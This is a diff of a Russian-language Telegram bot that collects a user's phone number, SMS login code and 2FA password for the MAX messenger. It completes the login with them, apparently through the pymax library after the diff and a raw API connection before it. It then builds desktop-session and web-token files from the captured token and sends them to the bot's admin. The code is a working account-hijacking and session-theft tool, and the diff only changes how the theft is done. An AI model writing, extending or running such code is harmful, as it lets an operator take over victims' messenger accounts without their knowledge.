@@ -4,9 +4,7 @@ import asyncio
 import uuid
 import logging
 import time
-import struct
-import msgpack
-import random
+from pathlib import Path
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
@@ -24,9 +22,6 @@ logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
-API_HOST = "api.oneme.ru"
-API_PORT = 443
-
 class AuthState(StatesGroup):
     waiting_for_code = State()
     waiting_for_password = State()
@@ -34,7 +29,8 @@ class AuthState(StatesGroup):
 pending = {}
 
 def gen_password():
-    return ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@#", k=40))
+    import random, string
+    return ''.join(random.choices(string.ascii_letters + string.digits + "_@#", k=40))
 
 def build_desktop_json(token, device_id, session_id, password, user_id, phone):
     return {
@@ -78,27 +74,87 @@ async def send_files(phone, uid, work_dir, desktop, js):
     with open(wp, "w", encoding="utf-8") as f:
         f.write(js)
     await bot.send_document(ADMIN_ID, FSInputFile(dp),
-        caption=f"💻 <b>ДЕСКТОПНАЯ СЕССИЯ</b>\nНомер: {phone}", parse_mode="HTML")
+        caption=f"💻 <b>ДЕСКТОП</b>\nНомер: {phone}", parse_mode="HTML")
     await bot.send_document(ADMIN_ID, FSInputFile(wp),
-        caption=f"🌐 <b>ВЕБ-ТОКЕН (JS)</b>\nНомер: {phone}", parse_mode="HTML")
+        caption=f"🌐 <b>ВЕБ</b>\nНомер: {phone}", parse_mode="HTML")
 
-async def read_message(reader):
-    raw_len = await reader.readexactly(4)
-    length = struct.unpack(">I", raw_len)[0]
-    data = await reader.readexactly(length)
-    return msgpack.unpackb(data)
-
-async def write_message(writer, data):
-    packed = msgpack.packb(data)
-    writer.write(struct.pack(">I", len(packed)) + packed)
-    await writer.drain()
+def run_pymax(uid: int, phone: str, work_dir: str):
+    """Запускает pymax в отдельном процессе и ждёт код через файлы."""
+    from pymax import Client as MaxClient
+    
+    code_file = Path(work_dir) / "code.txt"
+    password_file = Path(work_dir) / "password.txt"
+    result_file = Path(work_dir) / "result.json"
+    status_file = Path(work_dir) / "status.txt"
+    
+    try:
+        # Пишем статус
+        status_file.write_text("connecting")
+        
+        client = MaxClient(phone=phone, work_dir=work_dir)
+        
+        # Патчим input
+        import builtins
+        original_input = builtins.input
+        
+        def patched_input(prompt=""):
+            prompt_lower = prompt.lower() if prompt else ""
+            if "code" in prompt_lower or "код" in prompt_lower:
+                status_file.write_text("waiting_code")
+                # Ждём пока появится файл с кодом
+                while not code_file.exists():
+                    time.sleep(0.5)
+                code = code_file.read_text().strip()
+                code_file.unlink()  # удаляем файл
+                status_file.write_text("checking_code")
+                return code
+            elif "password" in prompt_lower or "пароль" in prompt_lower:
+                status_file.write_text("waiting_password")
+                while not password_file.exists():
+                    time.sleep(0.5)
+                pwd = password_file.read_text().strip()
+                password_file.unlink()
+                status_file.write_text("checking_password")
+                return pwd
+            return original_input(prompt)
+        
+        builtins.input = patched_input
+        
+        status_file.write_text("starting")
+        client.start()
+        
+        # Успешно
+        result = {
+            "ok": True,
+            "token": client.token,
+            "user_id": client.my_id,
+            "device_id": str(uuid.uuid4()),
+            "session_id": int(time.time() * 1000)
+        }
+        result_file.write_text(json.dumps(result))
+        status_file.write_text("done")
+        
+        builtins.input = original_input
+        
+    except Exception as e:
+        error_msg = str(e)
+        if "block" in error_msg.lower():
+            status_file.write_text("blocked")
+        elif "invalid" in error_msg.lower() or "wrong" in error_msg.lower():
+            status_file.write_text("invalid_code")
+        elif "limit" in error_msg.lower() or "flood" in error_msg.lower():
+            status_file.write_text("flood")
+        elif "password" in error_msg.lower() or "2fa" in error_msg.lower():
+            status_file.write_text("need_password")
+        else:
+            status_file.write_text(f"error:{error_msg}")
+        result_file.write_text(json.dumps({"ok": False, "error": error_msg}))
 
 @dp.message(F.text == "/start")
 async def cmd_start(message: types.Message):
     await message.answer(
         "👋 Привет! Отправь номер телефона в формате:\n\n"
-        "<code>+79111111111</code>\n\n"
-        "Я запрошу код подтверждения у MAX.",
+        "<code>+79111111111</code>",
         parse_mode="HTML"
     )
 
@@ -109,60 +165,49 @@ async def phone_handler(message: types.Message, state: FSMContext):
     work_dir = f"cache/{uid}"
     os.makedirs(work_dir, exist_ok=True)
     
-    status_msg = await message.answer("⏳ Подключаюсь к MAX...")
+    status_msg = await message.answer("⏳ Отправляю SMS...")
     
-    try:
-        reader, writer = await asyncio.open_connection(API_HOST, API_PORT, ssl=True)
-        device_id = str(uuid.uuid4())
-        
-        # Handshake
-        await write_message(writer, {
-            "op": "handshake",
-            "device_type": "DESKTOP",
-            "app_version": "25.12.13",
-            "device_id": device_id
-        })
-        
-        handshake_resp = await read_message(reader)
-        logging.info(f"Handshake: {handshake_resp}")
-        
-        # Запрос SMS
-        await write_message(writer, {
-            "op": "auth.sendCode",
-            "phone": phone
-        })
-        
-        sms_resp = await read_message(reader)
-        logging.info(f"SMS response: {sms_resp}")
-        
-        if sms_resp.get("ok"):
-            pending[uid] = {
-                "phone": phone,
-                "work_dir": work_dir,
-                "reader": reader,
-                "writer": writer,
-                "device_id": device_id
-            }
-            await state.set_state(AuthState.waiting_for_code)
-            await state.update_data(phone=phone, work_dir=work_dir)
-            await status_msg.edit_text("✅ SMS отправлена. Введи код из 6 цифр:")
-        
-        elif sms_resp.get("error"):
-            error_msg = sms_resp.get("error", "")
-            if "block" in str(error_msg).lower():
+    # Очищаем старые файлы
+    for f in ["code.txt", "password.txt", "result.json", "status.txt"]:
+        Path(work_dir, f).unlink(missing_ok=True)
+    
+    pending[uid] = {
+        "phone": phone,
+        "work_dir": work_dir,
+        "status_msg": status_msg
+    }
+    
+    await state.set_state(AuthState.waiting_for_code)
+    await state.update_data(phone=phone, work_dir=work_dir, uid=uid)
+    
+    # Запускаем pymax в отдельном потоке
+    import threading
+    thread = threading.Thread(target=run_pymax, args=(uid, phone, work_dir), daemon=True)
+    thread.start()
+    
+    # Ждём статус
+    status_file = Path(work_dir) / "status.txt"
+    for _ in range(30):
+        await asyncio.sleep(1)
+        if status_file.exists():
+            status = status_file.read_text().strip()
+            if status == "waiting_code":
+                await status_msg.edit_text("✅ SMS отправлена. Введи код из 6 цифр:")
+                return
+            elif status == "blocked":
                 await status_msg.edit_text("🚫 Аккаунт заблокирован или удалён.")
-            elif "limit" in str(error_msg).lower() or "flood" in str(error_msg).lower():
-                await status_msg.edit_text("⏳ Слишком много попыток. Подождите.")
-            else:
-                await status_msg.edit_text(f"❌ Ошибка сервера: {error_msg}")
-            writer.close()
-        
-        else:
-            await status_msg.edit_text(f"❌ Неожиданный ответ: {sms_resp}")
-            writer.close()
-            
-    except Exception as e:
-        await status_msg.edit_text(f"❌ Ошибка подключения: {e}")
+                del pending[uid]
+                await state.clear()
+                return
+            elif status.startswith("error:"):
+                await status_msg.edit_text(f"❌ Ошибка: {status[6:]}")
+                del pending[uid]
+                await state.clear()
+                return
+    
+    await status_msg.edit_text("❌ Таймаут. Попробуй ещё раз.")
+    del pending[uid]
+    await state.clear()
 
 @dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
 async def code_handler(message: types.Message, state: FSMContext):
@@ -170,79 +215,76 @@ async def code_handler(message: types.Message, state: FSMContext):
     code = message.text.strip()
     
     if uid not in pending:
-        return await message.answer("⏳ Сессия устарела. Отправь номер заново через /start.")
-    
-    status_msg = await message.answer("⏳ Проверяю код...")
+        return await message.answer("⏳ Сессия устарела.")
     
     data = await state.get_data()
-    phone = data["phone"]
     work_dir = data["work_dir"]
-    reader = pending[uid]["reader"]
-    writer = pending[uid]["writer"]
-    device_id = pending[uid]["device_id"]
+    phone = data["phone"]
     
-    try:
-        await write_message(writer, {
-            "op": "auth.login",
-            "phone": phone,
-            "code": code
-        })
+    # Записываем код в файл
+    code_file = Path(work_dir) / "code.txt"
+    code_file.write_text(code)
+    
+    status_msg = await message.answer("⏳ Проверяю код...")
+    pending[uid]["status_msg"] = status_msg
+    
+    # Ждём результат
+    status_file = Path(work_dir) / "status.txt"
+    result_file = Path(work_dir) / "result.json"
+    
+    for _ in range(30):
+        await asyncio.sleep(1)
+        if not status_file.exists():
+            continue
+        status = status_file.read_text().strip()
         
-        login_resp = await read_message(reader)
-        logging.info(f"Login response: {login_resp}")
-        
-        error_code = login_resp.get("error_code", "")
-        error_msg = login_resp.get("error", "")
-        
-        # Успешный вход
-        if login_resp.get("ok") and login_resp.get("token"):
-            token = login_resp.get("token", "")
-            viewer_id = login_resp.get("user_id", 0)
+        if status == "done" and result_file.exists():
+            result = json.loads(result_file.read_text())
+            token = result["token"]
+            viewer_id = result["user_id"]
+            device_id = result["device_id"]
+            session_id = result["session_id"]
             password = gen_password()
-            session_id = int(time.time() * 1000)
             
             desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
             js = generate_web_js(password, device_id, token, viewer_id)
             
             await send_files(phone, uid, work_dir, desktop, js)
             await status_msg.edit_text("✅ Готово! Файлы отправлены админу.")
-            
-        # Требуется пароль 2FA
-        elif login_resp.get("need_password") or "password" in str(login_resp).lower():
-            await state.set_state(AuthState.waiting_for_password)
-            await status_msg.edit_text("🔐 Аккаунт защищён паролем 2FA. Введи пароль:")
+            del pending[uid]
+            await state.clear()
             return
         
-        # Аккаунт заблокирован
-        elif "block" in str(login_resp).lower() or error_code == "auth.blocked":
-            await status_msg.edit_text("🚫 Аккаунт заблокирован или удалён.")
+        elif status == "need_password":
+            await state.set_state(AuthState.waiting_for_password)
+            await status_msg.edit_text("🔐 Введи пароль 2FA:")
+            return
         
-        # Неверный код
-        elif "invalid" in str(login_resp).lower() or "wrong" in str(login_resp).lower() or error_code == "auth.invalid_code":
+        elif status == "invalid_code":
             await status_msg.edit_text("❌ Неверный код. Попробуй ещё раз.")
             return
         
-        # Лимит попыток
-        elif "limit" in str(login_resp).lower() or "flood" in str(login_resp).lower():
-            await status_msg.edit_text("⏳ Слишком много попыток. Подожди немного и попробуй снова.")
-        
-        # Другая ошибка
-        else:
-            await status_msg.edit_text(f"❌ Ошибка сервера: {error_msg or login_resp}")
-        
-        writer.close()
-        del pending[uid]
-        await state.clear()
-        
-    except Exception as e:
-        await status_msg.edit_text(f"❌ Ошибка соединения: {e}")
-        try:
-            writer.close()
-        except:
-            pass
-        if uid in pending:
+        elif status == "blocked":
+            await status_msg.edit_text("🚫 Аккаунт заблокирован или удалён.")
             del pending[uid]
-        await state.clear()
+            await state.clear()
+            return
+        
+        elif status == "flood":
+            await status_msg.edit_text("⏳ Слишком много попыток. Подожди.")
+            del pending[uid]
+            await state.clear()
+            return
+        
+        elif status.startswith("error:"):
+            await status_msg.edit_text(f"❌ {status[6:]}")
+            del pending[uid]
+            await state.clear()
+            return
+    
+    await status_msg.edit_text("❌ Таймаут.")
+    del pending[uid]
+    await state.clear()
 
 @dp.message(AuthState.waiting_for_password)
 async def password_handler(message: types.Message, state: FSMContext):
@@ -250,66 +292,65 @@ async def password_handler(message: types.Message, state: FSMContext):
     pwd = message.text.strip()
     
     if uid not in pending:
-        return await message.answer("⏳ Сессия устарела. Отправь номер заново через /start.")
-    
-    status_msg = await message.answer("⏳ Проверяю пароль...")
+        return await message.answer("⏳ Сессия устарела.")
     
     data = await state.get_data()
-    phone = data["phone"]
     work_dir = data["work_dir"]
-    writer = pending[uid]["writer"]
-    reader = pending[uid]["reader"]
-    device_id = pending[uid]["device_id"]
+    phone = data["phone"]
     
-    try:
-        await write_message(writer, {
-            "op": "auth.sendPassword",
-            "password": pwd
-        })
+    # Записываем пароль в файл
+    password_file = Path(work_dir) / "password.txt"
+    password_file.write_text(pwd)
+    
+    status_msg = await message.answer("⏳ Проверяю пароль...")
+    pending[uid]["status_msg"] = status_msg
+    
+    # Ждём результат
+    status_file = Path(work_dir) / "status.txt"
+    result_file = Path(work_dir) / "result.json"
+    
+    for _ in range(30):
+        await asyncio.sleep(1)
+        if not status_file.exists():
+            continue
+        status = status_file.read_text().strip()
         
-        resp = await read_message(reader)
-        logging.info(f"Password response: {resp}")
-        
-        error_msg = resp.get("error", "")
-        
-        # Успешно
-        if resp.get("ok") and resp.get("token"):
-            token = resp.get("token", "")
-            viewer_id = resp.get("user_id", 0)
+        if status == "done" and result_file.exists():
+            result = json.loads(result_file.read_text())
+            token = result["token"]
+            viewer_id = result["user_id"]
+            device_id = result["device_id"]
+            session_id = result["session_id"]
             password = gen_password()
-            session_id = int(time.time() * 1000)
             
             desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
             js = generate_web_js(password, device_id, token, viewer_id)
             
             await send_files(phone, uid, work_dir, desktop, js)
-            await status_msg.edit_text("✅ Готово! Файлы отправлены админу.")
+            await status_msg.edit_text("✅ Готово!")
+            del pending[uid]
+            await state.clear()
+            return
         
-        # Неверный пароль
-        elif "invalid" in str(resp).lower() or "wrong" in str(resp).lower():
+        elif status == "invalid_code":
             await status_msg.edit_text("❌ Неверный пароль. Попробуй ещё раз.")
             return
         
-        # Аккаунт заблокирован
-        elif "block" in str(resp).lower():
+        elif status == "blocked":
             await status_msg.edit_text("🚫 Аккаунт заблокирован.")
-        
-        else:
-            await status_msg.edit_text(f"❌ Ошибка: {error_msg or resp}")
-        
-        writer.close()
-        del pending[uid]
-        await state.clear()
-        
-    except Exception as e:
-        await status_msg.edit_text(f"❌ Ошибка соединения: {e}")
-        try:
-            writer.close()
-        except:
-            pass
-        if uid in pending:
             del pending[uid]
-        await state.clear()
+            await state.clear()
+            return
+        
+        elif status.startswith("error:"):
+            await status_msg.edit_text(f"❌ {status[6:]}")
+            del pending[uid]
+            await state.clear()
+            return
+    
+    await status_msg.edit_text("❌ Таймаут.")
+    del pending[uid]
+    await state.clear()
 
 async def main():
     logging.info("Бот запущен!")
